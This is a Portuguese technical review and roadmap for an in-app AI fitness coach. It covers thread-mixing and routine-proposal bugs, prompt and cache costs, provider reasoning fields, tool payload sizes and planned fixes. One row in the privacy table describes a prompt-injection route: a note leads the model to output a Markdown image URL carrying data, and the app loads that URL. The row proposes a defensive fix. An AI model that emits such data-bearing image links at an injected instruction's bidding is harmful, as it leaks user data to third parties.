# AI Coach — revisão e plano para um agente "state of the art" (set/2026)

**Método.** Li o código inteiro do AI Coach: orquestrador (`lib/state/ai_chat_*.dart`), cliente HTTP (`ai_service.dart`), contexto, 41 tools, propostas, persistência, UI e configurações. Medi o prompt e o catálogo. Rodei todas as tools num banco sintético de "usuário pesado":

- 68 treinos e 156 corridas;
- 90 noites de sono e 45 dias de diário alimentar;
- 4 rotinas completas e um plano de corrida de 12 semanas.

Os bugs marcados como **(reproduzido)** foram confirmados com testes descartáveis numa cópia do repo fora da árvore de trabalho; nada no repo foi alterado além deste arquivo. As afirmações sobre provedores (DeepSeek, Gemini, OpenRouter, OpenAI) vêm da documentação atual, com as fontes no fim do documento.

Severidade: **Crítico** (corrompe dados ou quebra o recurso), **Alto**, **Médio**, **Baixo**. Esforço: **P** (≤ 1 dia), **M** (2–4 dias), **G** (1–2 semanas).

---

## 0. Resumo executivo

A arquitetura é boa, e várias decisões estão certas e devem ser mantidas:

- o loop é limitado por orçamento de tokens, não por contagem;
- as leituras rodam em paralelo;
- o catálogo é estável;
- as escritas passam por proposta e aprovação;
- a aplicação das propostas é transacional, com *claim* de status e detecção de proposta obsoleta;
- os tokens ficam no `flutter_secure_storage`;
- as tabelas de IA ficam fora do export.

O que impede o recurso de ser bom e confiável cabe em oito problemas:

1. **Integridade de dados.**
   - Trocar de conversa durante um turno move as mensagens de uma conversa para outra.
   - Uma proposta de rotina pode **roubar dias de outra rotina** ou **apagar exercícios**.
   - A prévia não mostra o que será aplicado.
   - O "tentar de novo" deixa mensagens fantasmas no banco.
2. **Custo fixo alto e cache quebrado.**
   - Cada request carrega cerca de 34 mil caracteres fixos, ~10 mil tokens (prompt + políticas + catálogo), antes de qualquer histórico.
   - O bloco dinâmico do turno fica **antes** do histórico, então o histórico nunca é reaproveitado do cache entre turnos.
   - Quando a conversa passa do orçamento, **cada turno** faz uma chamada extra de resumo.
3. **Heurísticas por regex em português controlam o loop.**
   - Palavras-chave decidem `tool_choice: required`.
   - Palavras-chave também desviam o turno inteiro para o fluxo de "criar alimento". Por exemplo, "adicione comida no meu diário" vira proposta de cadastro de alimento.
4. **Tools devolvem payloads grandes demais.**
   - Nove chamadas com argumentos padrão passam do limite de 8.000 caracteres (até 29k).
   - O corte acontece no meio do JSON e, em várias tools, descarta justamente os dados mais recentes.
5. **Compatibilidade com modelos de raciocínio.**
   - O `reasoning_content` (DeepSeek) e a `thought_signature` (Gemini 3) são descartados.
   - Nesses provedores a segunda rodada de tools devolve **HTTP 400**.
6. **Idioma.** Usuários com o app em inglês recebem respostas em português.
7. **UX.**
   - Não há como cancelar um turno, e a espera pode chegar a minutos.
   - Não há streaming.
   - Erros vêm com bloco técnico enorme.
   - Os cards de tool fazem *pretty-print* do JSON inteiro mesmo recolhidos.
8. **Cobertura.**
   - Escrita: só existem 2 tipos de proposta (rotina e alimento manual). Registrar refeição, peso, meta ou ajustar plano não é possível.
   - Leitura: periodização (fases, metas da semana) e o feed de recordes não estão expostos.

### Números-chave (medidos)

| Item | Hoje | Meta |
|---|---|---|
| System prompt padrão | 9.826 chars | ~4.000 (inglês, sem duplicação) |
| Políticas fixas (grounding + rotina) | 5.439 chars | ~2.000 |
| Catálogo de tools (41 tools, JSON compacto) | 18.509 chars ≈ 5,3k tokens | ~11.000 chars |
| Custo fixo por request | ≈ 33,8k chars ≈ 9,5–10k tokens | ≈ 17k chars ≈ 5k tokens (estimativa) |
| Chamadas padrão de tool > 8.000 chars | 9 de 39 | 0 |
| Maior resultado padrão | 29.130 chars (`get_run_plan_detail`) | ≤ 6.000 |
| Chamadas extras de resumo em conversa longa | 1 por turno | 1 a cada ~N turnos (histerese) |
| Testes que exercitam `send()` / loop do turno | 0 | cobertura de envio, cancelamento, troca de conversa, retry e recuperação |

---

## 1. Como funciona hoje (mapa rápido)

Fluxo de um turno:

```
send()
  └─ _runTurn()
       ├─ AiToolHints.forQuery(texto)          regex PT/EN → "dicas" + decide tool_choice
       ├─ _context.build()                      <workout_data> só com contagens
       ├─ _ensureThreadSummary()                resumo do que saiu da janela
       └─ loop de rodadas:
            ├─ _buildWireMessages()
            │    [system estático]
            │    [system dinâmico: dados + resumo + dicas]
            │    [histórico]
            ├─ sendChat()                       POST único, timeout de 180 s, sem streaming
            ├─ tools em paralelo (executeRead) ou propostas
            └─ repete até não haver tool_call
               (ou até o orçamento de 48k tokens / 8 rodadas)
```

Detalhes relevantes:

- **Histórico.** Ao chegar uma nova mensagem do usuário, os resultados de tool dos turnos anteriores são descartados do wire, mas continuam salvos para a UI. O que estoura o orçamento vira resumo.
- **Persistência.** Tudo é salvo no fim do turno, ou no caminho de erro.

---

## 2. Bugs que devem ser corrigidos primeiro

### 2.1 Integridade de dados

| Sev. | Problema | Onde | Correção |
|---|---|---|---|
| **Crítico** | **Trocar de conversa durante um turno move as mensagens da conversa A para a B** (reproduzido). O histórico permite abrir outra conversa enquanto o turno roda. O `_runTurn` grava a lista local por cima de `_state.messages`, e `_persistCurrentThread` grava todas com `thread_id = activeThreadId` usando `INSERT OR REPLACE`. Resultado: A ficou com 0 linhas e B com 8. | `ai_chat_service.dart:669,680,753`; `ai_chat_persistence.dart:81`; `ai_chat_history_screen.dart:492-501` | Criar um `TurnContext` que guarda `threadId` e a lista de mensagens do turno. Gravar sempre pelo `threadId` do turno e só mexer em `_state` se a conversa ativa ainda for a do turno. Enquanto isso, bloquear abrir, criar e excluir conversa durante um turno. |
| **Crítico** | **"Nova conversa" ou "excluir" durante o turno reatribui a conversa antiga à próxima** (reproduzido). As mensagens do turno ficam em memória sem `activeThreadId`. O próximo `send` cria uma conversa nova e grava nela todas as mensagens antigas. | `ai_chat_threads.dart:92-104,185-217` | Mesmo `TurnContext`. Além disso, `newChat` e `deleteThread` devem limpar `routineProposals`. |
| **Crítico** | **Proposta `create` com ids `source_*` rouba dias de outra rotina** (reproduzido). Num pedido "duplique a rotina A como B", o modelo copia a árvore com os ids. A validação é pulada quando `before == null`, e o apply faz `UPDATE ... SET routine_id = <nova>` nas linhas de A. A ficou com 0 dias, e a prévia não mostrou nenhuma remoção. | `ai_routine_mutation_service.dart:263`; `ai_routine_mutation_repository.dart:266-275,320-329,370-379` | Rejeitar `source_*` em `create`. Tornar o apply de `create` somente-insert. Verificar que cada `UPDATE` afetou exatamente 1 linha. |
| **Crítico** | **Proposta `update` que move um exercício para um dia posterior apaga o exercício e suas séries** (reproduzido). O delete "fora do keep" roda por dia, antes de o exercício ser processado no dia de destino; o `UPDATE` posterior afeta 0 linhas e ninguém percebe. | `ai_routine_mutation_repository.dart:332-347` | Aplicar em duas fases: primeiro *upsert* de tudo, depois um delete global do que não está no conjunto mantido. Mais a verificação de linhas afetadas. |
| **Alto** | **A prévia não mostra o que será aplicado** (reproduzido). O diff compara só contagens líquidas. Trocar supino por agachamento ou subir a carga de 60 para 200 kg aparece como "0 alterações", sem diálogo de confirmação. O card nunca mostra reps, carga, aquecimento, superset, ordem, nem o nome atual da rotina num `update`. | `ai_routine_mutation_service.dart:324-381`; `ai_routine_proposal_card.dart:137-147,355` | Diff estruturado (adicionado, removido e alterado por item, com antes→depois por campo). Mostrar o nome atual da rotina. Confirmação obrigatória para remoções e trocas. |
| **Médio** | **O "tentar de novo" deixa mensagens fantasmas no SQLite** (reproduzido). `retryFromMessage` só trunca a memória e o repositório não tem delete. Ao reabrir a conversa aparecem as duas tentativas intercaladas, e propostas da tentativa abandonada continuam aprováveis. | `ai_chat_service.dart:437-460`; `ai_chat_repository.dart:79-93` | Apagar, no mesmo batch, os ids truncados e as propostas deles (por `tool_call_id`), ou marcá-los como `superseded`. Resetar o resumo se `through_message_id` sumir. |
| **Médio** | **Duplo envio cria duas conversas e dois turnos** (reproduzido). `isSending` só vira `true` depois de três `await`s (token, imagens, criação da conversa). O retry também não verifica `isSending`. | `ai_chat_service.dart:229-293,437` | Usar uma flag síncrona `_sendInFlight` logo na entrada. Mostrar o retry apenas na última resposta e desabilitá-lo durante um turno. |
| **Médio** | **Nada é salvo até o fim do turno.** Se o Android matar o processo durante uma chamada de 60 s, a mensagem do usuário se perde e sobra uma conversa vazia no histórico. A recuperação de turno interrompido praticamente nunca dispara e, quando dispara, cria as mensagens sintéticas só em memória. | `ai_chat_service.dart:669-676,1215-1253` | Persistir a mensagem do usuário imediatamente e fazer *checkpoint* a cada rodada. Adicionar uma coluna de status do turno (`running`, `done`, `failed`, `cancelled`). |
| **Alto** | **As análises de bem-estar contam treinos planejados e futuros** (reproduzido). Falta `end_time IS NOT NULL` e um limite superior de data. Com 5 treinos futuros, a semana atual mostrou 6 treinos em vez de 4 e surgiu uma "semana" no futuro. Isso afeta `analyze_sleep_performance`, `get_weekly_recovery_trend` e as correlações. | `ai_wellness_analytics_service.dart:360-406`, também `:122,:254` | Adicionar `w.end_time IS NOT NULL AND w.date <= hoje` e limite superior nas consultas de nutrição. |

### 2.2 Configurações, privacidade e erros

| Sev. | Problema | Onde | Correção |
|---|---|---|---|
| **Alto** | **Um prompt personalizado com menos de 200 caracteres é apagado em silêncio a cada inicialização.** Por exemplo, "Responda em inglês, seja breve." é substituído pelo padrão. | `ai_settings_notifier.dart:198-201` | Manter só a detecção dos prompts legados. Ver §3.9 (instruções personalizadas). |
| **Alto** | **Usuário com o app em inglês recebe respostas em português.** O prompt padrão diz "Responda sempre em português brasileiro", o contexto envia `locale: 'pt_BR'` fixo, e o resumo da conversa e o estilo de resposta estão em PT. `appLanguageCode` só é usado no resumo de proposta aplicada. | `ai_settings_notifier.dart:29`; `ai_context_service.dart:90`; `ai_chat_service.dart:98`; `ai_settings.dart:80-93` | Adicionar uma diretiva de idioma derivada do idioma do app na parte fixa do prompt (§3.8). |
| **Médio** | **O redator de erros destrói a mensagem técnica.** `replaceAll(RegExp, r'$1 [oculto]')`: o Dart não expande `$1`, e o padrão `token` casa com "tokens". "maximum context length is 8192 tokens" vira "8192 $1 [oculto]". Exatamente os erros mais úteis (contexto, `max_tokens`) ficam ilegíveis. | `ai_chat_service.dart:1292-1309` | Usar `replaceAllMapped` e redigir só `Bearer …`, `sk-…` e `api_key=…`. |
| **Médio** | **O Markdown da resposta carrega imagens remotas.** Sem `imageBuilder`, o `flutter_markdown_plus` usa `Image.network`. Uma resposta com `![](https://host/?dados)`, por exemplo vinda de *prompt injection* em uma nota, faz o app buscar a URL. Isso vaza dados e o IP. | `ai_message_bubble.dart:348-392` | Adicionar um `imageBuilder` que renderiza só o texto alternativo. |
| **Médio** | **O texto "Sobre" diz que os dados ficam no aparelho**, mas um resumo vai em todo turno e imagens são enviadas ao provedor. Não há consentimento. | ARB `aiSettingsAboutBody` | Texto honesto e consentimento único no primeiro uso. |
| **Médio** | **As transcrições de IA entram no backup automático do Google.** O padrão do Android é backup ligado, e o export do próprio app as exclui. As transcrições crescem sem limite (§9) e podem estourar a cota de 25 MB, o que interrompe o backup dos dados de treino. | `android/app/src/main/AndroidManifest.xml` (sem regras) | Regras de backup explícitas. Se o resto do banco precisa ir para o backup, mover as tabelas de IA para um arquivo separado ou limpar payloads. |

### 2.3 Compatibilidade com provedores

| Sev. | Problema | Onde | Correção |
|---|---|---|---|
| **Alto** | **Tool calling em várias rodadas quebra nos modelos de raciocínio.** <br>• DeepSeek em modo thinking exige devolver `reasoning_content` nas mensagens de assistente com tools; sem isso, HTTP 400. <br>• Gemini 3 pela camada OpenAI exige devolver `tool_calls[].extra_content.google.thought_signature`; sem isso, HTTP 400. <br>• OpenRouter recomenda devolver `reasoning_details` para preservar o raciocínio. <br>`AiToolCall.fromJson` e `toJson` descartam todos esses campos. | `ai_tool_call.dart`; `ai_service.dart:241-271` | Guardar os "extras opacos do provedor" de cada mensagem de assistente (`provider_extras` em JSON) e reenviá-los sem alteração **dentro do turno**. Remover entre turnos, salvo quando o provedor exigir o contrário. |
| **Médio** | **A rodada final, a regeneração e o resumo da proposta aplicada são enviados sem `tools`** com transcript contendo mensagens `tool`. Vários backends rejeitam isso; o próprio código registra o problema em `ai_chat_service.dart:756-758`. Remover `tools` também muda o prefixo cacheável no request mais caro. | `ai_chat_service.dart:560-565,1151`; `ai_chat_persistence.dart:159` | Manter o mesmo `tools` e usar `tool_choice: "none"`. |
| **Médio** | **Os ajustes de compatibilidade (`_ModelCompatibility`) ficam só em memória.** A cada abertura do app, o primeiro request para um modelo que rejeita `temperature` ou `reasoning_effort` toma um 400 e é repetido. | `ai_service.dart:62` | Persistir por provedor+modelo em `shared_preferences`. |
| **Médio** | **Timeout de 180 s com retry automático do POST.** `Future.timeout` não aborta o request, então o original continua rodando e é cobrado. O retry dobra o custo e a espera, que chega a 6 min por chamada. 429 é tentado de novo após 350/900 ms, ignorando `Retry-After`. | `ai_service.dart:168-225` | Abortar de verdade (o `package:http` 1.6 já resolvido no lock tem `Abortable`). Não repetir timeout. Respeitar `Retry-After`. |
| **Baixo** | **`normalizeBaseUri` sempre acrescenta `/v1`.** `.../v1beta/openai` (Gemini) vira `.../v1beta/openai/v1` e dá 404. URL vazia vira `/v1`, então a validação de "URL obrigatória" nunca dispara. | `ai_service.dart:79-86` | Só acrescentar `/v1` quando o caminho estiver vazio. Validar esquema e host. |

---

## 3. Contexto, tokens e cache

### 3.1 Custo fixo por request

| Bloco | Chars | Observação |
|---|---|---|
| System prompt padrão (`kDefaultAiCoachSystemPrompt`) | 9.826 | PT. Repete a lista de tools, a autonomia de rotina e a de alimento. |
| `_dataGroundingPolicy` | 3.455 | ~1,4k chars repetem qual tool responde o quê (isso já está nas descrições). |
| `_routineMutationPolicy` | 1.984 | Terceira cópia da política de rotina. |
| Catálogo de tools | 18.509 | 21% são as 2 tools de proposta; 27% é boilerplate de schema. |
| `<workout_data>` | ~600 | Só contagens. |
| **Total fixo** | **≈ 34k chars ≈ 9,5–10k tokens** | Reenviado em **toda rodada**; um turno com 3 rodadas manda 3 vezes. |

A política de alimento manual aparece em **4 lugares**:

- o prompt padrão;
- `_dataGroundingPolicy`;
- `_manualFoodProposalPrompt`;
- a descrição da tool.

A de rotina aparece em **3**. O texto em português também tokeniza pior que o inglês: estimo 10–20% a mais.

### 3.2 O cache de prompt não funciona entre turnos — **Alto**

O cache de prefixo dos provedores (automático na OpenAI e no DeepSeek; explícito via `cache_control` para Anthropic e Gemini no OpenRouter) só reaproveita o **prefixo idêntico**, na ordem tools → mensagens. Hoje o wire é:

```
[tools] [system estático] [system dinâmico: workout_data + resumo + DICAS DO TURNO] [histórico ...] [última msg]
```

As "dicas" mudam a cada mensagem do usuário. Por isso **todo o histórico vem depois de um bloco que mudou** e nunca é servido do cache entre turnos. Dentro do mesmo turno o prefixo é estável, e isso está correto.

O layout recomendado vai do mais estável para o mais volátil:

```
[tools — estáveis, ordenadas]
[system: prompt do produto (versionado) + instruções personalizadas + idioma]
[system: snapshot do dia + memória de longo prazo]    ← muda no máximo 1×/dia ou quando a memória muda
[system: resumo da conversa]                          ← muda só em eventos de compactação
[histórico — só cresce no final]
[mensagem atual do usuário + notas efêmeras (hora local, etc.)]
```

- Remover as "dicas de tools" (§4.1). Se alguma dica for mantida, ela vai no fim, junto da mensagem atual.
- OpenAI: enviar `prompt_cache_key` (por exemplo, o id da conversa) para melhorar o roteamento do cache.
- OpenRouter com modelos Anthropic ou Gemini: usar o `cache_control` automático de topo ou *breakpoints* explícitos (até 4) no fim do bloco estável e no fim do histórico.
- Ler `usage.prompt_tokens_details.cached_tokens` (OpenAI/OpenRouter) e `prompt_cache_hit_tokens` (DeepSeek) **apenas para diagnóstico** (§10). Isso respeita a decisão de não mostrar custo ao usuário.

### 3.3 Compactação sem histerese — **Alto**

Quando a conversa passa do orçamento de histórico (~21k tokens úteis), cada turno novo empurra o turno mais antigo para fora. Isso tem dois efeitos:

1. O início do histórico muda a cada turno, então o cache é perdido.
2. `_ensureThreadSummary` vê um `dropped.last.id` novo e faz **uma chamada extra ao modelo a cada turno**, com até 24k chars de transcript.

Correção:

- Compactar por marca d'água: ao passar de ~85% do orçamento, compactar até ~50%. O resumo só é refeito nesses eventos, ou seja, uma vez a cada vários turnos, e o prefixo fica estável entre eles.
- O resumo deve ser gerado no idioma do app e, opcionalmente, por um "modelo utilitário" mais barato (§5).
- Hoje o resumo considera só a página carregada (100 mensagens). Ao reabrir uma conversa longa, `through_message_id` pode não ser encontrado e o resumo é refeito sobre conteúdo já resumido. O resumo também deve ser invalidado quando um retry voltar para antes dele.

### 3.4 Resultados de tool de turnos anteriores — **Médio**

Hoje todo resultado de tool de turnos passados é descartado. Isso economiza tokens, mas obriga a consultar de novo em continuações como "e a segunda série?".

Proposta:

- Manter os resultados do **último turno** completos.
- Nos turnos anteriores, manter a estrutura `tool_call`/`tool` com um *stub* curto, por exemplo `{"cleared":true,"tool":"get_workout_detail","args":{...},"note":"chame de novo se precisar"}`. O modelo sabe o que já consultou sem pagar pelo conteúdo.
- Trocar o conteúdo pelos stubs **em lote, junto com a compactação**, para não quebrar o cache a cada turno.

### 3.5 Truncamento de resultados — **Alto** (ver §6.2)

`_wireToolContent` corta o JSON em 8.000 caracteres e embute o pedaço como *string* dentro de outro JSON. São três problemas:

- o JSON resultante é inválido;
- o escape das aspas infla o texto em cerca de 10–15%;
- em tools ordenadas da mais antiga para a mais recente, o corte descarta justamente os dias recentes.

O limite tem de ser aplicado **na origem**: cada tool respeita um orçamento e devolve `hasMore`/`nextPage`. O corte no wire continua só como rede de segurança, cortando em fronteira de item e produzindo JSON válido.

### 3.6 `<workout_data>` traz pouco valor — **Médio**

O bloco atual só tem contagens (treinos, séries, exercícios, rotinas…) e "disponibilidade" de dados. O modo "full" só acrescenta uma lista fixa de domínios. A configuração "modo de contexto" com três níveis confunde o usuário sem mudar a qualidade das respostas.

A proposta é trocá-lo por um **snapshot do dia** de ~1–1,5k chars, que muda no máximo uma vez por dia ou quando os dados mudam:

- data, dia da semana e unidades (kg, km/mi);
- fase ativa do plano e metas do dia (kcal e proteína; dia de treino ou descanso);
- rotina ou corrida planejada para hoje;
- último treino e última corrida (data e resumo de uma linha);
- peso mais recente e tendência;
- até 3 metas ativas com progresso;
- sono da última noite (duração e eficiência).

Isso resolve de cara as perguntas mais comuns ("o que faço hoje?", "como estou?") e evita 1–2 rodadas de tools por turno. A hora local muda o tempo todo, então vai como nota efêmera na mensagem atual.

### 3.7 Memória de longo prazo — **Alto (valor)**

Hoje só existe o resumo **por conversa**. Um treinador precisa lembrar de fatos estáveis entre conversas:

- lesões e restrições ("dor no ombro direito");
- equipamentos disponíveis;
- preferências (não gosta de agachamento livre);
- disponibilidade (treina 4×/semana, 45 min);
- objetivo principal.

Proposta:

- Criar a tabela `ai_memories`: `id`, `text`, `category`, `source_thread_id`, `created_at`, `updated_at`.
- Criar a tool `propose_memory_update` (adicionar, editar ou remover). Ela pode ser aplicada direto com um aviso discreto e "desfazer" (risco baixo), ou passar pelo fluxo de proposta.
- Adicionar uma tela "O que o treinador sabe sobre você" nas configurações, com edição e exclusão.
- Injetar as memórias no bloco estável (≤ 1k chars).

### 3.8 Reescrita do prompt — **Alto**

- Escrever as instruções base **em inglês**: são mais compactas e os modelos seguem melhor. Acrescentar a diretiva "Always answer in {Português do Brasil | English} unless the user asks otherwise", derivada de `appLanguageCode`.
- Remover a lista de tools do prompt, porque o catálogo já descreve isso. Deixar uma única fonte para cada política: rotina e alimento ficam nas descrições das tools mais uma regra curta no prompt.
- Mover para a parte **fixa, não editável** do prompt as regras clínicas e de segurança (dor, lesão, sem diagnóstico, sono não clínico) e a de idioma. Hoje essas regras estão no prompt editável e somem se o usuário personalizar.
- Datas: "formate datas no padrão do idioma do usuário" em vez de `dd/mm/aaaa` fixo.
- Meta: system fixo ≤ 6k chars no total. Hoje são 15,3k.

### 3.9 Instruções personalizadas no lugar de "prompt editável inteiro" — **Médio**

Hoje o usuário edita o prompt inteiro. Isso causa três problemas:

1. "Restaurar padrão" grava uma **cópia** do texto. Melhorias futuras do prompt nunca chegam a quem já salvou.
2. Personalizar remove as regras de segurança.
3. Ao clicar no campo (só mudar o cursor), o botão Salvar já fica ativo.

O modelo recomendado separa as camadas:

- **prompt do produto** versionado no código, não editável;
- **instruções personalizadas** do usuário: tom, persona, foco (≤ 2k chars), acrescentadas depois do prompt do produto. Vazio significa "sem personalização".

A migração converte um prompt salvo igual a uma versão antiga do padrão em "vazio".

---

## 4. Loop do agente (harness)

### 4.1 Remover o roteamento por regex — **Alto**

| Mecanismo | Problema |
|---|---|
| `AiToolHints.forQuery` (524 linhas de palavras-chave PT/EN) | Gera as "dicas" (quebram o cache, §3.2) e decide `requiresGroundedToolCall`. |
| `_looksLikeFollowUp`, `_looksLikeGeneralKnowledgeQuestion`, `_mentionsPersonalData`, `_isRoutineProposalFollowUp` | Funcionam **só em português**. Para quem escreve em inglês, a classificação erra e `tool_choice: required` é forçado com mais frequência. |
| Desvio do "alimento manual" (`criar\|adicionar…` + `alimento\|comida`) | **Sequestra o turno inteiro**: outro system prompt, sem o contexto, só uma tool, e o turno acaba sem resposta em texto. "Adicione comida no meu diário: 2 ovos" vira proposta de *cadastro* de alimento. |
| `_retryMissingRequiredToolCall` | Quando o modelo responde sem tool, faz uma chamada extra completa e depois aceita a resposta direta mesmo assim. |

Com modelos atuais, o estado da arte é deixar o modelo decidir: `tool_choice: auto`, descrições boas, uma regra clara de grounding no prompt e avaliação para medir (§10). Se um modelo específico pular tools com frequência, a correção é uma **flag por modelo** ("forçar tool na 1ª rodada"), configurável e medida, não regex.

O fluxo do alimento manual vira uma tool comum dentro do loop normal, com o mesmo prompt e contexto. O fallback JSON continua apenas quando o provedor rejeitar o schema.

### 4.2 `TurnContext` e concorrência — **Crítico** (ver §2.1)

Um objeto por turno com estes campos:

- `threadId`;
- a lista de mensagens do turno;
- um `CancellationToken`;
- os diagnósticos do turno;
- o *reasoning effort*.

Hoje diagnósticos e *reasoning effort* são campos do singleton e o `finally` de um turno zera os do outro. Todas as gravações usam `ctx.threadId`, e a UI só é atualizada se `activeThreadId == ctx.threadId`. O mesmo vale para o resumo da proposta aplicada (reproduzido: o resumo caiu em outra conversa) e para a atualização do card de alimento.

### 4.3 Cancelar — **Alto**

- Botão **Parar** no lugar do spinner do campo de envio.
- O cancelamento aborta o HTTP de verdade (`Abortable` do `package:http` ou um `http.Client` exclusivo do turno), descarta a resposta em voo e persiste o turno como `cancelled`, mantendo a mensagem do usuário e as tools já executadas.

### 4.4 Persistência incremental (write-ahead) — **Médio**

- Persistir a mensagem do usuário assim que a conversa existir.
- Fazer checkpoint depois de cada rodada (assistente + tools).
- Status do turno numa coluna, para que a recuperação marque `interrupted` de forma persistente, ao lado da mensagem correta, e trate propostas pendentes cuja tool não chegou a responder.

### 4.5 Streaming — **Alto (UX)**, revisita uma decisão do CLAUDE.md

A decisão "No streaming" simplificou o código, mas é o maior responsável pela sensação de lentidão. Uma resposta de raciocínio longa fica até 3 minutos sem nenhum texto na tela.

Com SSE:

- o texto aparece progressivamente;
- o *delta* de tool call permite mostrar "Consultando: sono, nutrição" assim que o modelo decide;
- o timeout vira um **timeout de inatividade** (por exemplo 45 s sem bytes) em vez de 180 s totais. Isso também acaba com os falsos timeouts de modelos que raciocinam por muito tempo.

Manter o modo sem streaming como fallback por compatibilidade, por provedor e modelo. Esforço **G**: parser SSE de Chat Completions e de Responses, montagem dos deltas de tool call e UI incremental.

### 4.6 Guardas do loop — **Baixo**

- Memorizar chamadas idênticas (mesmo nome e argumentos) dentro do turno e devolver o resultado já obtido.
- Detectar a mesma tool falhando repetidamente.
- Manter o orçamento de 48k e 8 rodadas.

### 4.7 Chamadas extras que podem sumir — **Médio**

| Chamada extra | Hoje | Proposta |
|---|---|---|
| Resumo após aplicar uma proposta | Chamada completa ao modelo, sem `tools` (cache perdido e risco de 400). Bloqueia o chat por até 3 min. | Mensagem de confirmação determinística e localizada, mais um "evento" curto no transcript para o modelo ver no próximo turno. Fazer o mesmo para rejeição e proposta obsoleta, que hoje o modelo nunca fica sabendo. |
| Regeneração de `$1`/`${1}` | Até 2 chamadas completas. | Medir a frequência com avaliação. Se for rara, só sanitizar; se não, regenerar com `tools` + `tool_choice:none` (fica em cache). |
| Resumo da conversa | 1 por turno em conversas longas | Histerese (§3.3) e modelo utilitário. |
| Retry de tool obrigatória | 1 chamada completa | Some com §4.1. |

---

## 5. Camada de provedor

| Prioridade | Item |
|---|---|
| Alta | Repassar os **extras opacos de raciocínio** dentro do turno (§2.3): `reasoning_content`, `reasoning_details`/`reasoning` e `extra_content` dos `tool_calls`. |
| Alta | Rodada final, regeneração e eventos com o **mesmo `tools` + `tool_choice:"none"`**. |
| Média | **Perfil de capacidades** por provedor+modelo, persistido: tools, `tool_choice` required/none, visão, streaming, cache, `temperature` aceita, `reasoning_effort` aceito. Preenchido pelos ajustes automáticos e por um botão **"Testar conexão"** nas configurações. |
| Média | Hoje a API Responses só é usada para visão no OpenCode. Um **adaptador Responses API** para modelos de raciocínio OpenAI mantém o raciocínio entre chamadas de tool, o que a Chat Completions descarta, e melhora o cache. |
| Média | Erros por classe: 400 (pedido inválido ou contexto longo demais), 402 (cobrança), 403, 413, 429 (limite, com `Retry-After`). Hoje tudo vira `http_error`. |
| Média | **Modelo utilitário** opcional (mais barato) para resumo e títulos. |
| Baixa | `max_completion_tokens` nas chamadas utilitárias e `parallel_tool_calls: true` explícito. |
| Baixa | Campo para digitar o id do modelo à mão, para provedores sem `/models`. Buscar os modelos automaticamente ao salvar o provedor. |
| Baixa | Remover usuário e senha e query do `baseUrl` ao salvar; o `baseUrl` entra no export. |

---

## 6. Catálogo de ferramentas

### 6.1 Tamanho

São 41 tools (39 de leitura e 2 de proposta), 18.509 chars ≈ 5,3k tokens. A composição é:

- 33% descrições;
- 46% parâmetros;
- 21% boilerplate.

As 10 tools mais pesadas somam 45% do catálogo.

| Tool | Chars | Observação |
|---|---|---|
| `propose_manual_food_creation` | 2.411 | Lista de 20 nutrientes. |
| `propose_routine_change` | 1.414 | |
| `get_workout_history` | 705 | |
| `get_sleep_night_detail` | 618 | Repete o aviso "não clínico", que já está no prompt e no resultado. |
| `list_run_activities` | 585 | |

Para economizar sem perder capacidade:

- remover `required: []` (30 ocorrências) e `default` (30), já que os handlers aplicam os padrões;
- omitir `parameters` nas tools sem argumento;
- descrições em inglês;
- tirar das descrições as regras que pertencem ao prompt.

### 6.2 Resultados grandes demais — **Alto**

Tamanhos medidos com argumentos padrão no banco sintético. O limite atual no wire é 8.000 chars.

| Tool | Chars | × limite |
|---|---|---|
| `get_run_plan_detail` (12 sem.) | 29.130 | 3,6× |
| `get_routine_detail` (4 dias × 6 ex × 4 séries) | 21.900 | 2,7× (47% são UUIDs duplicados) |
| `get_run_progress` (ano) | 20.712 | 2,6× |
| `get_nutrition_history` (30 d) | 17.456 | 2,2× (ordem ASC: o corte perde os dias recentes) |
| `get_sleep_history` (30 d) | 14.841 | 1,9× |
| `search_food_library` (15) | 12.930 | 1,6× |
| `get_run_schedule` (4 sem.) | 12.210 | 1,5× |
| `list_run_activities` (20) | 10.827 | 1,4× |
| `get_nutrition_diary_day` (12 itens) | 10.829 | 1,4× |
| `list_saved_meals` (15) | 9.964 | 1,2× |

O aviso de truncamento sugere `page`/`page_size`, mas plano, rotina, progresso de corrida e histórico de nutrição **não têm** parâmetro para reduzir o resultado.

### 6.3 `AiToolResultShaper` — um formatador comum na saída das tools — **Alto**

Transformações testadas sobre as saídas reais:

| Tool | Antes | Depois (arredondar + tabular) | Economia |
|---|---|---|---|
| `get_nutrition_history` | 17,4k | 5,1k | −71% |
| `get_run_progress` (ano) | 20,7k | 7,4k | −64% |
| `get_sleep_history` | 14,8k | 5,7k | −62% |
| `list_run_activities` | 10,8k | 4,3k | −60% |
| `get_sleep_summary` | 3,75k | 1,5k | −60% |
| `get_workout_history` | 7,85k | 3,6k | −55% |

Regras do shaper:

1. **Arredondar**:
   - metros e calorias para inteiro;
   - ritmo e velocidade com 1 casa;
   - correlações com 2–3 casas. Hoje elas saem com 1 casa, o que é pouca precisão: 0,04 vira 0,0.
2. **Tabular** listas homogêneas com 3 ou mais itens no formato `{"cols":[...],"rows":[[...]]}`. Os nomes das chaves são 40–75% do payload hoje.
3. **Limitar** cada resultado a ~6k chars com `hasMore`, `nextPage` e `total`.
4. **Mais recente primeiro** por padrão.
5. **Ids únicos**:
   - Rotina: manter só os `source_*_id` (−6k chars na rotina).
   - Categorias: devolver uma legenda única em vez de repetir UUIDs por linha.
   - `get_cardio_summary`: devolver ids das atividades em vez de 20 objetos completos (que hoje são 6,4k dos 7k chars).
6. **Timestamps** como `yyyy-MM-ddTHH:mm`, sem `.000`.
7. **Remover textos repetidos dos resultados**, que custam 70–330 chars por chamada: `nullSemantics`, `dataSemantics`, `interpretationWarning`, `privacy` e similares. Dizer uma vez no prompt que "campo ausente = não informado". Hoje `_pruneNulls` remove os `null` enquanto o prompt fala em "preservar null".
8. Adicionar um teste: no banco "usuário pesado", toda chamada padrão de toda tool tem até 6k chars.

### 6.4 Consolidação de tools — **Médio**

Doze tools são a mesma consulta com padrões diferentes. Consolidar economiza ~3,4k chars e reduz a ambiguidade na escolha:

| Hoje | Proposta |
|---|---|
| `list_recent_workouts` + `get_workout_history` | `get_workout_history` (`list_recent_workouts` é literalmente `history(status:'completed')`) |
| `get_progress_trend` + `get_exercise_history` | `get_exercise_history` (a "tendência" não calcula tendência alguma) |
| `get_weekly_volume_breakdown` + `get_training_summary` | `get_training_summary(group_by=week\|category)` |
| `get_nutrition_summary` + `get_nutrition_history` + `get_micronutrient_summary` | `get_nutrition(days, end_date, detail=macros\|micros\|daily)` |
| `get_sleep_summary` + `get_sleep_history` | `get_sleep(days, detail=summary\|nightly)` |
